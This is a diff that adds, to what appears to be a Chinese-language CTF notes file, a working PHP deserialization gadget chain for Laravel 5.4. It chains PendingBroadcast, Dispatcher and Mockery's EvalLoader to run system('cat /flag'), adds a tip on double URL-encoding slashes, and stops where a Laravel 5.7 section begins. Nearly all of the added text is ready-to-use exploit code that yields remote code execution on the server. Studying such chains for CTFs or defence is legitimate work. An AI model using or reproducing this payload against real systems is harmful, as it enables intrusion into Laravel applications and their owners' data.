@@ -1,3 +1,58 @@
+## **Laravel5.4反序列化**
+如果生产payload罕有`/`，需要进行url编码，这里需要进行两次编码`%252f`
+```
+<?php
+namespace Mockery\Generator {
+    class MockConfiguration {
+        protected $name = 'fallingskies';
+    }
+    class MockDefinition {
+        protected $config;
+        protected $code;
+        public function __construct() {
+            $this->config = new MockConfiguration();
+            $this->code = "<?php system('cat /flag');?>";
+        }
+    }
+}
+
+namespace Mockery\Loader {
+    class EvalLoader {}
+}
+
+namespace Illuminate\Bus {
+    use Mockery\Loader\EvalLoader;
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct() {
+            $this->queueResolver = [new EvalLoader(), 'load'];
+        }
+    }
+}
+
+namespace Illuminate\Broadcasting {
+    use Illuminate\Bus\Dispatcher;
+    use Mockery\Generator\MockDefinition;
+    class BroadcastEvent {
+        public $connection;
+        public function __construct() {
+            $this->connection = new MockDefinition();
+        }
+    }
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct() {
+            $this->events = new Dispatcher();
+            $this->event = new BroadcastEvent();
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast()));
+}
+?>
+```
+
+
 ## **Laravel5.7反序列化**
 ```
 <?php
